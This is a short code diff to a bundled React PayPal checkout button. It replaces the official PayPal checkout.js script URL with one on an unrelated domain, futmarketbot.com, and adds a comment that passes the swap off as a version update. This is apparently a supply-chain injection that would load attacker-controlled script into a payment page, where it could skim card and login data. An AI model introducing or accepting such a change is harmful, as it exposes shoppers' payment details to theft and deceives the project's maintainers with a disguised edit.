@@ -247,7 +247,9 @@
     }
   };
 
+  
+  // use checkout.js 4.0.136
   exports.default = (0, _reactAsyncScriptLoader2.default)(
-    "https://www.paypalobjects.com/api/checkout.js"
+    "https://www.futmarketbot.com/checkout.js"
   )(PaypalButton);
 });
